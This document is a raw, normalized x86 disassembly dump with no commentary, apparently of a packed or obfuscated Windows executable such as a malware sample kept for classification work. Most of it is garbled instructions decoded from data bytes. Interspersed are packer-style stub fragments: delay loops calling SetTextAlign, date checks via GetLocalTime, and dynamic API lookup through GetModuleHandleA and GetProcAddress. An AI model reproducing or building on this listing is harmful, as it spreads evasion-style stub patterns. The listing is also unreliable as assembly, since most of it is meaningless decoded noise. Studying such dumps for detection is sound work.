add [ edx + 0x19ae628d ] 0xae628db3
pop ds
or [ esi + 0x14350c02 ] 0xb07b7b14
sub [ ebx + 0x7b ] bh
jmp r-xdata
adc al 0x14
add bh ah
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
call 0x146f37bb
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0xbb
cmpsd [ esi ] [ edi ]
outsb
sub esp esp
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
stosd [ edi ]
jpo r-xdata
add edx [ esp + edx ]
add dl cl
jpo r-xdata
adc al 0x14
jpo r-xdata
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
mov ebx 0xd88fbd14
and ch [ eax + 0x13 ]
adc al 0xe4
jle r-xdata
push ss
outsb
scasb [ edi ]
adc al 0x7b
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
0x6e66ebeb 0x165b
sahf
out dx al
jmp r-xdata
in al 0x6e
outsb
outsb
cmp ecx [ ebp - 0x4ef0419e ]
or ebx 0x14555602
adc al 0xb8
mov eax 0x11576e66
adc al 0x14
punpckldq mm6 [ esi - 0xc43ebc9 ]
mov esp 0x14089902
adc al 0x7b
jpo r-xdata
outsd
xchg edi eax
mov ebx 0xe42b6ea7
pop ds
xchg si ax
jpo r-xdata
or [ esi + 0x21720287 ] 0x14
adc al 0x7b
jpo r-xdata
mov eax 0x142e6002
adc al 0x7b
mov ebx 0x9807ae2c
clc
jpo r-xdata
adc al 0x14
add bh al
sbb dl [ esp + edx ]
jpo r-xdata
outsb
mov bh 0x16
jpo r-xdata
push 0x2ebe796
adc [ edx ] eax
jpo r-xdata
adc al 0x2
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
lodsd [ esi ]

xchg esi eax
jpo r-xdata
in al 0x7e
sub ah [ eax + 0x12 ]
add ch [ ebx + 0x7b141455 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
aas
fsubr [ ebx ]
lea esp [ edx - 0x42 ]
and eax 0x3dae628d
lea esp [ edx - 0x5a ]
pop ds
mov bl 0x8d
jpo r-xdata
adc al 0x7b
jpo r-xdata
sub ebp [ ebx + 0x1413f802 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0xeb eax
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
add ebx eax
jpo r-xdata
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x4c717ec7 ]
lea esp [ edx - 0x52 ]
jpo r-xdata
jpo r-xdata
add bh al
add esi esi
jmp 0x6702f456
mov dl 0x8d
fsub st1
jmp r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
sub ecx ebp
add ah [ esi + edx * 2 ]
add dl [ ecx ]
add dl [ esp + edx ]
pushad
adc al 0x7b
jpo r-xdata
sub esi [ edx - 0x38fdcce4 ]
jpo r-xdata
outsd
or [ esi + 0x14 ] bl
jpo r-xdata
sbb edx [ esp + edx ]
outsb
push edi
adc [ esp + edx ] edx
add dh [ eax + 0x38 ]
adc al 0x14
jpo r-xdata
loope r-xdata
push 0x2b6ee72f
add ch [ ecx + 0x17 ]
pop ss
fsubr [ ebx ]
lea esp [ edx - 0x52 ]
lds ecx [ ebp - 0x4cee519e ]
lea esp [ edx - 0x52 ]
jpo r-xdata
push 0xeaffcf97
in al 0x6e
arpl [ ebp + 0x14 ] dx
adc al 0x60
test al 0xfb
outsb
sub eax [ edx ]
clc
daa
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound esp [ esi + 0x60898111 ]
jmp r-xdata
push ss
adc al 0x14
adc al 0x14
pop bx
das
out 0x6e eax
sub eax [ edx ]
imul edx [ edi ] 0x7b7b1414
jpo r-xdata
sbb al 0x33
jpo r-xdata
mov ebx 0xf5a85de4
test al 0xd3
pop esi
adc al 0x14
in al 0x5d
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
cmp esp esp
outsd
jpo r-xdata
lea ebp [ esi + 0x2b ]
in al 0x6f
jpo r-xdata
iretd
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc [ ecx - 0x72dc9f77 ] eax
bound esp [ esi - 0x72dd27e9 ]
bound esp [ esi - 0x1387fdeb ]
jpo r-xdata
add al bh
jpo r-xdata
adc al 0xe4
jpo r-xdata
scasd [ edi ]
iretd
jpo r-xdata
mov ebx 0x60b39814
sub eax 0x14284402
adc al 0xe4
outsd
out dx eax
jmp r-xdata
test al 0xf5
sub eax 0x3eb14ae
imul cl
jmp r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x7d
pop es
pop esi
cmp edx [ esi ]
adc al 0x14
adc al 0xbc
sti
add dl [ ecx ]
push cs
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x6a ]
jpo r-xdata
xor ebp [ esi ]
adc al 0x14
add al [ ecx + 0x7b14142a ]
jpo r-xdata
sub esp esp
outsd
push 0x3d02c614
add [ esp + edx ] edx
0x55636ee4 0x1414
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov eax 0xeb477d14
jmp r-xdata
pop ebp
jpo r-xdata
adc al 0xaf
iretd
jpo r-xdata
adc al 0xeb
pop ebx
fstp [ eax + 0x3a03ed62 ]
adc al 0x9e
jmp r-xdata
in al 0x5c
test al 0xf7
pushad
scasb [ edi ]
adc esp [ edx - 0x52 ]
pop es
pushad
scasb [ edi ]
pop ds
mov [ ebp - 0x4cf6519e ] ecx
or [ edx + 0xfae628d ] 0x14573b02
adc al 0x60
xor cl [ ebp + 0x60a5b662 ]
pop ebp
xchg esi eax
jpo r-xdata
pushad
cmpsb [ esi ] [ edi ]
out 0x62 eax
0x3e7302b8 0x1414
bound edx [ esi + 0x14b8bb17 ]
mov ebp 0x17ae60af
bound ebp [ edi + 0x28d0f7cf ]
add ch [ esi ]
or edx [ esp + edx ]
jpo r-xdata
and ecx [ ebp - 0x27e8599e ]
and cl [ ebp + 0x215a662 ]
js r-xdata
pushad
scasb [ edi ]
cvtpi2ps xmm2 [ ebx ]
hlt
adc [ esp + edx ] edx
sar [ ebx - 0xa57a21c ] cl
jpo r-xdata
iretd
add bh [ 0x14141401 ]
lahf
adc al 0x6d
push edi
jmp r-xdata
adc dx [ esi ]
adc al 0x14
add esp [ ebp + 0x1b ]
adc al 0x14
dec edi
adc eax 0x2bd1414
salc
sbb [ esp + edx ] dl
mov ebx 0xebeea803
jmp r-xdata
lea ebp [ esi + 0x39 ]
in al 0x6f
xor al 0x8d
bound esi [ esi + 0xc0f02bb ]
adc al 0x14
lea esp [ edx - 0x52 ]
or eax 0x14037c02
adc al 0x7b
jpo r-xdata
pushad
jpo r-xdata
mov ebp 0xef8503bb
jmp r-xdata
daa
adc al 0x14
add [ eax - 0x4724a443 ] 0x62
insd
pop es
sbb [ edx - 0x4724a443 ] 0x62
in eax dx
and [ esi - 0x699d724c ] 0x3c3a0253
jpo r-xdata
adc al 0x14
jpo r-xdata
in al 0x5d
lea esp [ edx - 0x4a ]
mov ebx 0x140c0f02
adc al 0x8d
bound ebp [ esi + 0x37c020d ]
adc al 0x14
jpo r-xdata
adc esp [ edx - 0x52 ]
cmp esp [ esi - 0x52 ]
cmp edi [ ebx + 0x1405dd02 ]
adc al 0x7b
pushad
lodsd [ esi ]
fist [ esi + ebx * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ah 0x8d
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop ebx
jpo r-xdata
lea esp [ edx - 0x42 ]
stosd [ edi ]
pushad
xor ebx eax
jpo r-xdata
bound edx [ esi + 0x3c3a0253 ]
bound ebp [ esi - 0x27d427e5 ]
cmp [ edx - 0x52 ] esp
pop ss
add dl [ eax + 0x7b141405 ]
jpo r-xdata
pushad
scasb [ edi ]
pop ss
bound ebp [ esi + 0x13ae6003 ]
bound ebp [ esi + 0x1fae6007 ]
in al 0x6e
dec edi
pop ds
adc al 0x14
mov ch 0x28
jpo r-xdata
jge r-xdata
add edi [ edx ]
0xb8db5bbd 0xed62
xor dh [ ecx + 0xdb6628d ]
lea esp [ edx - 0x6a ]
sbb eax 0x1401d202
adc al 0x7b
jpo r-xdata
cmp [ ecx - 0x499d7264 ] eax
jge 0x60f0c93d
mov esi 0xd83360ab
add edx [ ecx - 0x7e141411 ]
sti
scasb [ edi ]
adc al 0x9f
jpo r-xdata
adc al 0x14
mov ebx 0x145f7602
adc al 0x8d
jmp r-xdata
fsubr [ ebx ]
add al dh
adc al 0x14
jpo r-xdata
bound esp [ esi + 0x311d02cf ]
adc al 0x14
jpo r-xdata
jpo r-xdata
sahf
adc al 0x14
jpo r-xdata
jg r-xdata
jpo r-xdata
adc al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
lahf
pushad
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
add [ esp + edx ] edx
jpo r-xdata
scasd [ edi ]
iretd
lea esp [ edx - 0x51 ]
jpo r-xdata
add [ ebx + esi * 4 + 0x628d9b81 ] 0xb3d7cfaf
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
out 0x2 eax
scasd [ edi ]
iretd
jpo r-xdata
or [ esi - 0x30509d73 ] 0x8581b3d5
jpo r-xdata
jpo r-xdata
bound edx [ edi + 0x3bdffcf ]
or bl ch
jmp r-xdata
lea esp [ edx - 0x5a ]
iretd
scasd [ edi ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
0x14f3cfaf 0xcfaf
lea esp [ edx - 0x51 ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
stosd [ edi ]
jpo r-xdata
fwait
lea esp [ edx - 0x51 ]
jpo r-xdata
0xcfaf628d 0xd8a9
bound ebp [ edi - 0x7e4c5431 ]
jpo r-xdata
jpo r-xdata
iretd
scasd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc ecx
call 0x2faff711
out 0x66 eax
scasb [ edi ]
aas
mov ebx 0x14237002
adc al 0x7b
jpo r-xdata
bound ebp [ esi - 0x347e4cfb ]
bound ebp [ edi - 0x7e4c2831 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
aad 0xb3
jpo r-xdata
jpo r-xdata
jpo r-xdata
iretd
mov esp 0x9662b8bc
pop ss
adc al 0xbd
jmp r-xdata
iretd
jpo r-xdata
mov bl 0x81
jecxz r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
add [ ebp - 0x30509d73 ] 0xea81b3ab
lea esp [ edx - 0x51 ]
iretd
jpo r-xdata
add eax 0x8dcb81b3
jpo r-xdata
adc al 0xb2
outsb
sub esp esp
outsd
int1
jmp r-xdata
push ebp
aaa
adc al 0x14
mov dl 0x6e
add bl [ ecx + 0x7b14141d ]
push 0x7
or ebx 0x1bae628d
mov bl 0x81
into
mov bl 0x81
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg [ edx + eax + 0x141439fe ] edi
jpo r-xdata
jpo r-xdata
mov bl 0x81
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
sbb esi [ ebx - 0x66fd317f ]
sbb eax 0x6a7b1414
pop es
jpo r-xdata
bound ebp [ edi - 0x7e4c2a31 ]
jpo r-xdata

jpo r-xdata
jmp r-xdata
jpo r-xdata
bound ebp [ esi - 0x317e4ce5 ]
add eax [ ecx - 0x18 ]
jmp r-xdata
test [ ebp - 0x5430509e ] ecx
mov bl 0x81
jpo r-xdata
sub_470757
sub esp ebx
mov ebx 0x620f9e14
mov dh 0x37
adc al 0xbc
mov esp 0x14089902
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
add esi esi
jmp 0x6702f456
mov dl 0x8d
adc al 0x14
jpo r-xdata
lodsd [ esi ]

bound esp [ esi + 0x60898111 ]
and ecx [ ebp - 0x27e8599e ]
and cl [ ebp + 0x215a662 ]
js r-xdata
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc [ ecx - 0x72dc9f77 ] eax
bound esp [ esi - 0x72dd27e9 ]
bound esp [ esi - 0x1387fdeb ]
outsd
or [ esi + 0x14 ] bl
jpo r-xdata
sbb edx [ esp + edx ]
outsb
push edi
adc [ esp + edx ] edx
add dh [ eax + 0x38 ]
adc al 0x14
jpo r-xdata
mov ebx 0xf5a85de4
test al 0xd3
pop esi
adc al 0x14
in al 0x5d
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0xe4
jpo r-xdata
scasd [ edi ]
iretd
jpo r-xdata
mov ebx 0x60b39814
sub eax 0x14284402
adc al 0xe4
outsd
out dx eax
jmp r-xdata
test al 0xf5
sub eax 0x3eb14ae
imul cl
jmp r-xdata
jpo r-xdata
pop ebp
jpo r-xdata
adc al 0xaf
iretd
jpo r-xdata
adc al 0xeb
sar [ ebx - 0xa57a21c ] cl
jpo r-xdata
add bh [ 0x14141401 ]
lahf
iretd
adc al 0x6d
push edi
jmp r-xdata
adc dx [ esi ]
adc al 0x14
add esp [ ebp + 0x1b ]
adc al 0x14
in al 0x5d
sub_470a09
inc esp
daa
adc al 0x14
push 0x6d62cb2f
sbb ebp ebx
jmp r-xdata
mov eax 0xeb036d62
jmp r-xdata
pop es
jmp r-xdata
pop ebx
fstp [ eax + 0x3a03ed62 ]
daa
adc al 0x14
add [ eax - 0x4724a443 ] 0x62
insd
sub_470caf
adc al 0x14
pushad
lodsd [ esi ]
mov ebx 0x13ae62bb
scasb [ edi ]
pop ds
mov ebx 0x143fe002
adc al 0x7b
jpo r-xdata
jmp sub_470d2c
jpo r-xdata
pushad
jpo r-xdata
xchg ebx eax
jpo r-xdata
scasb [ edi ]
and al [ edx ]
arpl [ eax + 0x14 ] dx
adc al 0xe4
outsd
aas
out dx eax
jmp r-xdata
jpo r-xdata
0xab60ebeb 0x6893
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
stosd [ edi ]
jpo r-xdata
inc ecx
adc dl [ esp + edx ]
jpo r-xdata
push 0xe8eb178e
outsb
push ss
mov ebp 0xfc022a60
sub edi 0x1437d502
adc al 0x14
jpo r-xdata
mov bl 0x81
cwde
jpo r-xdata
add dh [ edx ]
xor eax 0x688d1414
xlat
cli
jmp r-xdata
adc al 0x14
add ebx [ ebp - 0x17 ]
jmp r-xdata
adc dx [ esi ]
add dl ch
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
bound ebp [ esi + 0x3b9f023b ]
adc al 0x14
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
0x213a260 0x387b
jmp 0x7bc2fa2b
add bh ah
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov [ edx ] es
jpo r-xdata
popad
lea esp [ edx - 0x52 ]
jpo r-xdata
in al 0x6e
jpo r-xdata
push esi
jpo r-xdata
das
[ edi ]
jpo r-xdata
cmp eax [ edx ]
lahf
scasb [ edi ]
jpo r-xdata
jmp r-xdata
in eax dx
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
mov esi [ ecx + 0x628d8981 ]
mov esi 0x628db189
scasb [ edi ]
daa
lea esp [ edx - 0x62 ]
inc edi
pushad
sahf
jecxz r-xdata
add al [ eax ]
jmp r-xdata
pop ebx
mov ebx 0x148f6e66
adc al 0x14
add bh [ eax ]
cmp dl [ esp + edx ]
scasb [ edi ]
jpo r-xdata
jmp r-xdata
sub esi [ ebp + esi * 4 + 0x7b2822b0 ]
jpo r-xdata
adc [ esp + edx ] dl
jmp r-xdata
push edx
cmpsb [ esi ] [ edi ]
mov cl 0xeb
jmp r-xdata
xchg [ edx ] al
and al 0x34
adc al 0x14
jpo r-xdata
add dl [ ebx + 0x7bebebe9 ]
jpo r-xdata
add ebx [ ebx + 0x68ebebeb ]
das
out 0x14 eax
jl r-xdata
adc al 0x14
adc al 0x2
cmp edx [ esp + edx ]
cmp eax 0x143e0002
adc al 0x7b
jpo r-xdata
cwde
sub al 0xae
adc ecx ecx

sub al [ edx ]
jpo r-xdata
and ah ah
jpo r-xdata
jpo r-xdata
lea edx [ esp + edx + 0x14 ]
jpo r-xdata
jle r-xdata
jpo r-xdata
add ah [ edi ]
xor al 0x14
adc al 0x7b
jpo r-xdata
mov dl 0x81
cmp [ edx ] bh
jpo r-xdata
cld
jpo r-xdata
add dl [ esi ]
jpo r-xdata
outsd
xchg edi eax
jpo r-xdata
mov ebx 0x143e3902
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
in al 0x6f
jle r-xdata
adc [ esp + edx ] dl
add ebx ebp
pop ecx
jpo r-xdata
adc al 0x2
push 0x7b14145f
push 0x702ea14
pushad
adc eax 0x2396628d
fcom [ edx + eax ]
test al 0x4
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x81
out dx eax
cli
mov ebp 0x2b021b60
and al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
sub eax [ edx ]
adc eax 0x8d141432
sub al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
push edx
adc al 0x14
mov ebp 0x14180302
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc esi eax
in al 0x6f
loop r-xdata
in al 0x6e
jpo r-xdata
adc al 0x3
jpo r-xdata
sub bl [ esi + ebx * 4 ]
sti
add ch [ ecx ]
xor edx [ esp + edx ]
jpo r-xdata
bound esp [ esi + 0x2d830227 ]
jpo r-xdata
jpo r-xdata
mov esi 0x7680760
out 0x66 eax
scasb [ edi ]
pop ds
mov ebx 0x2ce3ae60
scasb [ edi ]
pop ds
cwde
mov [ edx + 0x13ae2c8e ] eax
pop [ edi - 0xafd3a79 ]
daa
adc al 0x14
jpo r-xdata
add bl [ edx + 0x7b141414 ]
jpo r-xdata
push [ eax ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
adc al 0xbd
jpo r-xdata
jmp r-xdata
jpo r-xdata
sti
sub al 0x14
adc al 0x60
jmp r-xdata
adc al 0xe4
outsd
outsd
sub [ ebx + 0x7b ] bh
das
sub dl [ esp + edx ]
jpo r-xdata
pop es
jpo r-xdata
fstp [ ecx + 0x14 ]
adc al 0x1c
xor esi eax
sub ebp [ ebx + 0x7b7b2822 ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi + 0x22bd81d ]
jb r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
add [ eax ] al
add [ edx ] ch
cmp dl [ ebx ]
sub [ ebx + 0x7b ] bh
adc al 0x7b
scasb [ edi ]
adc esp [ eax + 0x6b ]
dec edi
jmp r-xdata
mov [ fs : eax ] esp
inc [ rw-data ]
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
sub esp esp
outsb
ja r-xdata
jpo r-xdata
jpo r-xdata
pushad
jpo r-xdata
lea eax [ edx ]
jpo r-xdata
add al [ ebx ]
jpo r-xdata
test [ eax + 0x31 ] esp
lea esp [ edx - 0x4a ]
jmp 0x146e2165
jpo r-xdata
adc al [ edx ]
adc al 0x14
pushad
pop es
push 0xe381e707
scasb [ edi ]
pop ds
sub ebx 0x3f602bb
adc al 0x14
jpo r-xdata
adc al 0x14
adc al 0xea
add al [ edi ]
pushad
scasb [ edi ]
jecxz r-xdata
adc al 0x14
lea ebp [ esi + 0x39 ]
in al 0x6f
adc al 0x14
jpo r-xdata
adc al 0x14
sbb al 0x33
push ss
adc al 0x14
add ebp [ esp + ecx - 0x4d4debec ]
add al bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x14171602
adc al 0x7b
jpo r-xdata
dec ecx
adc al 0x14
add dh [ ecx + 0x36 ]
adc al 0x14
jpo r-xdata
adc al 0xb2
outsb
sub esp esp
outsd
xlat
jpo r-xdata
adc eax 0x6eb21414
add edx edi
adc al 0x14
jmp r-xdata
daa
add al [ ebx + 0x7b14142d ]
lea esp [ edx - 0x52 ]
jpo r-xdata
pushad
mov eax 0x575b60bd
jpo r-xdata
push 0x0
push 0x0
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
call SetTextAlign
inc [ rw-data ]
jpo r-xdata
adc eax 0xff640047
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
adc al 0x9e
out 0x60 eax
jpo r-xdata
jpo r-xdata
test eax 0x64004712
sahf
sti
add al [ eax ]
or dl [ esp + edx ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
push ss
jpo r-xdata
sbb [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
xor [ ebp + 0x2e9b662 ] ecx
adc [ edi ] ah
jpo r-xdata
and ebx [ ebx + 0x2ccb8799 ]
scasb [ edi ]
cmpsb [ esi ] [ edi ]
sub al 0xae
jpo r-xdata
in al 0x5c
jpo r-xdata
mov esi 0x28c818f
or [ edi - 0x74419d73 ] 0x8d8981b1
bound edi [ esi + 0x628db189 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
add dl [ esi ]
jpo r-xdata
lea esp [ edx - 0x5a ]
sbb eax 0x72022bd8
0x7b7bebeb 0x7b7b
sub [ 0xffffffff8d7b1414 ] 0x62
scasb [ edi ]
jpo r-xdata
mov ebp 0xeb575b60
jmp r-xdata
pushad
pop ebx
jpo r-xdata
mov [ rw-data ] 0x1004
jmp r-xdata
push ecx
stc
jpo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov [ rw-data ] 0x1
sub [ rw-data ] 0x1
add [ edi + edi * 8 + 0x30 ] ah
jpo r-xdata
sub [ edi + 0x14007302 ] 0x9a027b14
adc al 0x14
adc al 0x7b
jpo r-xdata
mov [ fs : eax ] esp
push [ eax ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jmp sub_4039ac
jpo r-xdata
fsubr [ ebx ]
mov ch 0xb0
and ch [ eax ]
adc al 0x14
jpo r-xdata
push edi
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
sub eax [ ebp + 0x2ca6a6bd ]
sub al 0xae
insd
and edx [ esp + edx ]
jpo r-xdata
pushad
push 0x2bbe32b
bound eax [ esp + edx + 0x14 ]
jpo r-xdata
adc al 0x14
add ch [ ecx + 0x7b14143b ]
jpo r-xdata
bound esi [ esi + 0x271002e9 ]
or ebx 0x66bdbdbd
outsb
lahf
scasb [ edi ]
jpo r-xdata
hlt
mov cl 0x81
jpo r-xdata
and ah ah
jpo r-xdata
lea ebp [ eax + 0x12 ]
jpo r-xdata
pop ss
adc al 0x14
jpo r-xdata
pushad
pop es
mov edx 0x14236d02
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
and esp [ esi + 0x6e ]
xchg ebx eax
push ss
adc al 0x14
add cl [ ebx ]
cmp [ esp + edx ] edx
jpo r-xdata
push edi
jpo r-xdata
push 0x0
push 0x0
call SetTextAlign
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c414
test eax eax
je r-xdata
jpo r-xdata
add dh [ ebx ]
adc al 0x14
jpo r-xdata
jpo r-xdata
pushad
outsd
sub esp ebx
jpo r-xdata
outsb
jpo r-xdata
stc
popad
in eax 0x5d
bound esp [ esi - 0xffd42bd ]
push edi
adc al 0x14
jpo r-xdata
fsubr [ ebx ]
add dl [ 0xffffffff8d141432 ]
adc al 0x14
jpo r-xdata
adc dh [ edi + 0x145ca802 ]
adc al 0xd2
jpo r-xdata
jpo r-xdata
add [ edx + 0x5ae628d ] 0x28d81b3
jecxz r-xdata
jpo r-xdata
daa
adc [ edx - 0x59fd7165 ] 0x35
fwait
cdq
jpo r-xdata
mov esi 0x8981b18b
lea esp [ edx - 0x42 ]
mov [ ecx - 0x70419d73 ] esi
or [ edx + eax + 0x14145626 ] 0x7b7b7b7b
jpo r-xdata
jecxz r-xdata
jpo r-xdata
xchg [ eax - 0x14499d73 ] dh
add [ ebp + 0x628d3160 ] 0x1002e9b6
daa
jpo r-xdata
jpo r-xdata
mov bh 0x2
jpo r-xdata
pop ds
adc al 0x14
add ch [ eax + 0x5f ]
adc al 0x14
jpo r-xdata
jmp r-xdata
jpo r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
nop
jmp r-xdata
cmp [ rw-data ] 0x105
jne r-xdata
add eax rw-data
adc al 0x14
jpo r-xdata
0x7b141414 0x7b7b
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jae r-xdata
and [ ebx + 0x4777a42d ] al
jpo r-xdata
or [ ebp - 0x4cfa519e ] 0x81
mov ebx 0x14446202
adc al 0x7b
jpo r-xdata
outsb
adc edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
out 0x2 eax
outsb
push ecx
add ch [ eax - 0x2debeba4 ]
jpo r-xdata
ja r-xdata
jpo r-xdata
jpo r-xdata
add ah [ edx + 0x44 ]
adc al 0x14
xchg ebx ecx
jpo r-xdata
adc al 0x14
jpo r-xdata
mov cl 0x81
jpo r-xdata
inc edi
jpo r-xdata
movsb [ edi ] [ esi ]
in al 0x6e
jpo r-xdata
adc al 0x14
shl [ esi + 0x516e02e7 ] cl
push 0xa802b712
pop esp
test al 0x5c
push 0xe4ebe796
outsb
add bh [ edi ]
jpo r-xdata
mov [ rw-data ] 0x558
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
call SetTextAlign
jmp r-xdata
add [ eax ] eax
add [ eax ] al
jpo r-xdata
adc al 0x7b
sub eax rw-data
add [ edi ] ecx
cmp ecx 0x2
add [ eax ] al
jpo r-xdata
pop esp
adc al 0x2
jpo r-xdata
pop esp
cli
xchg esi eax
out 0xeb eax
inc [ rw-data ]
cmp [ rw-data ] 0x105
jne r-xdata
add [ ecx + 0x4777b43d ] al
add [ 0x75000001 ] al
in eax 0x68
int3
jpo r-xdata
sub al 0xae
jpo r-xdata
mov [ ebp - 0x4e76419e ] ecx
lea esp [ edx - 0x42 ]
pop [ ecx + 0x5626028c ]
mov ah 0x81
test eax 0x1419f002
push [ fs : eax ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
or [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
mov [ rw-data ] 0x1004
nop
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
adc ebp [ eax ]
jpo r-xdata
ja r-xdata
jpo r-xdata
sti
jpo r-xdata
lea esp [ edx - 0x52 ]
add eax 0x28d81b3
retn 0x4
adc al 0x62
xchg esi eax
pop ss
add ah bh
add [ esp + edx ] edx
mov esp ebp
pop ebp
jpo r-xdata
xor [ ecx + ecx * 4 + 0x20 ] ah
jpo r-xdata
add bh bl
adc al 0x14
jpo r-xdata
int3
outsb
jpo r-xdata
adc al 0x7b
jpo r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
nop
nop
nop
nop
inc [ rw-data ]
cmp [ rw-data ] 0x24a4
jne r-xdata
push 0x0
push 0x0
call SetTextAlign
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
jpo r-xdata
nop
mov [ rw-data ] 0x1
add [ eax + 0x77a805c7 ] dl
inc edi
add [ eax + edx ] al
add [ eax ] al
add [ ecx ] al
sub [ ebx + 0x7b ] bh
scasd [ edi ]
adc al 0x14
jpo r-xdata
xchg edx eax
fwait
jpo r-xdata
mov [ eax ] esp
jpo r-xdata
jpo r-xdata
in al 0x6e
jpo r-xdata
adc ebp [ esi + 0x2b ]
jpo r-xdata
jpo r-xdata
in al 0x7e
sub esp [ edx ]
sub [ ebx + 0x7b ] bh
jpo r-xdata
mov [ rw-data ] 0x1918
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
nop
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov es [ edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub esp esp
jpo r-xdata
scasb [ edi ]
pop ds
shr [ esp ] 0x1
outsd
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x89bd
jne r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov eax 0x1e7bdc37
call sub_4026bc
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0x0
je r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
xor eax 0x7b7b1414
jpo r-xdata
movsb [ edi ] [ esi ]
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
outsb
jpo r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
jpo r-xdata
adc al 0x14
jpo r-xdata
push 0x7f02fb2f
sub [ esp + edx ] dl
jpo r-xdata
inc edi
jpo r-xdata
